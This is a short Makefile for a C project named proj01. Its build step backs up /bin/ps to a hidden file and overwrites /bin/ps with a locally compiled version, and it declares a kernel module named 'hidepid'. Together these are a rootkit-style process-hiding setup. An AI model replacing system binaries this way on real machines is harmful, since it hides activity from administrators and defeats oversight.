# Makefile pre proj01

CC = gcc
CFLAGS_APP = -Wall -ansi -pthread -g $(PNAME).c -o $(PNAME)
PNAME = proj01
obj-m += hidepid.o
PROCPS_PATH = procps/
PS_PATH = /bin/ps
PS_BACKUP_PATH = /bin/.ps.old
PS_COMPILED_PATH = ps/ps

build: $(PNAME).c
	$(CC) $(CFLAGS_APP)
	cd $(PROCPS_PATH);make;cp $(PS_PATH) $(PS_BACKUP_PATH);cp $(PS_COMPILED_PATH) $(PS_PATH)
	
restore: $(PNAME).c
	mv $(PS_BACKUP_PATH) $(PS_PATH)

#module:
#	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean: $(PNAME).c
	rm -f $(PNAME)
	cd $(PROCPS_PATH);make clean
	mv $(PS_BACKUP_PATH) $(PS_PATH)
	